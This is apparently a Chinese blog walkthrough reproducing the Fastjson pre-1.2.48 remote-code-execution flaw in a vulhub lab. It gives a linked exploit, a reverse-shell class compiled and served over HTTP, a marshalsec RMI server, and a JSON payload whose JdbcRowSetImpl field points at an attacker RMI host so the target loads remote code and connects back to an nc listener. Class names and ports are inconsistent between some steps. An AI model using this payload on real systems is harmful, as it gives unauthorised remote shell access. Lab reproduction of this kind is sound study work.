> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/HDBT2y7HrjcswxGM20hcWA)

**漏洞原理**  

Fastjson 是阿里巴巴公司开源的一款 json 解析器，其性能优越，被广泛应用于各大厂商的 Java 项目中。fastjson 于 1.2.24 版本后增加了反序列化白名单，而在 1.2.48 以前的版本中，攻击者可以利用特殊构造的 json 字符串绕过白名单检测，成功执行任意命令。

**影响环境**

Fastjson 1.2.48 以前版本

**漏洞复现**

环境使用的是 docker+vulhub 的环境搭建的

步骤：

```
1.Exploit.exp需要进行javac编译
2.所有用的工具和编译后的包要在同一目录，然后在该目录启动http服务和启动一个RMI服务器，监听9999端。其中RMI服务marshalsec.jndi.RMIRefServer 是需要jdk1.8版本的。(其中Exp下载地址里边已经有编译好的marshalsec-0.0.3-SNAPSHOT-all.jar，就不用下载meavn对marshalsec进行打包，能省去很长的时间)
3.发送构造好的请求包，nc监听得到反弹shell
```

Exp 下载地址 ：  

```
https://github.com/CaijiOrz/fastjson-1.2.47-RCE
```

下载好会有三个文件，其中 Exploit.java 只是一段反弹 shell 的代码，需要修改为攻击机的 ip 和端口

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDB2RavzFzLf5tjyy6WTBlPsG3k9yOYbbzRBZqYPyicicwRgibzSGl02UqN5iauaYMR0QMoZbwDr5gCMnw/640?wx_fmt=png)

然后来到 jdk 的 bin 目录下使用 javac 进行编译，编译成 class 文件，得到 Exploit.class

```
javac Exploit.java
```

把编译好的 Exploit.class 文件和 marshalsec-0.0.3-SNAPSHOT-all.jar 放置同一个目录下，然后发送至攻击机，然后在攻击机的 Exploit.class 目录下使用 python 开启站点

```
python -m SimpleHTTPServer  1111
yout-ip/TouchFile.class        //访问站点
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDB2RavzFzLf5tjyy6WTBlPsUicjwibGmuFogAP7MCtMnPmXTITC9c2KWF7G4I41bfmhYf9lPHZhCzcQ/640?wx_fmt=png)

然后借助 marshalsec 项目，启动一个 RMI 服务器，监听 9999 端口，并制定加载远程类 TouchFile.class  
安装 marshalsec，同时 mvn 也是需要安装的

```
安装mvn
官网下载压缩包 http://maven.apache.org/download.cgi
配置环境变量
vi /etc/profile
export MAVEN_HOME=/var/local/apache-maven-3.6.2
export MAVEN_HOME
export PATH=$PATH:$MAVEN_HOME/bin
编辑之后使用source /etc/profile命令使改动生效。
在任意路径下执行mvn -version验证命令是否有效
```

安装和使用 marshalsec

```
git clone https://github.com/mbechler/marshalsec.git 
cd marshalsec 
mvn clean package -DskipTests
```

装好 mvn 后运行 (若使用 mvn 时提示命令找不到，可以使用 source /etc/profile 更新一下环境变量)

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://your-ip:1234/#TouchFile" 9999
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDB2RavzFzLf5tjyy6WTBlPszicZgQc9RXRLR3VopuZdicIgT4f32WhSoa2LnQEaPbP5w669DiaicK8ncg/640?wx_fmt=png)

构造 exp 请求包，并多开端口进行 nc 监听 8888

```
{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://192.168.10.144:9999/Exploit",
        "autoCommit":true
    }
}
```

构造好的请求包发送如下，注意 Content-type 格式要 json，并且是 post 请求。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDB2RavzFzLf5tjyy6WTBlPsgzK93fQibtLicX5jpLyMkGwjiagZy56xeBPz9kVkAJIkg8lianx230fVGA/640?wx_fmt=png)

发送请求包后可以看到向指定 ip 加载远程类 TouchFile.class 

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDB2RavzFzLf5tjyy6WTBlPsObC7CaRqcKCXAqUKaVQ9ziaqicibH2qeAu2K9ro8eakvP0wvIZgturxHw/640?wx_fmt=png)

然后攻击机就能收到反弹回来的 shell 了

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDB2RavzFzLf5tjyy6WTBlPsN4pMnZj40t6G9zmSeyDeFqpUibuibawqxhiaruELkkoOKR2xXWNePUfibQ/640?wx_fmt=png)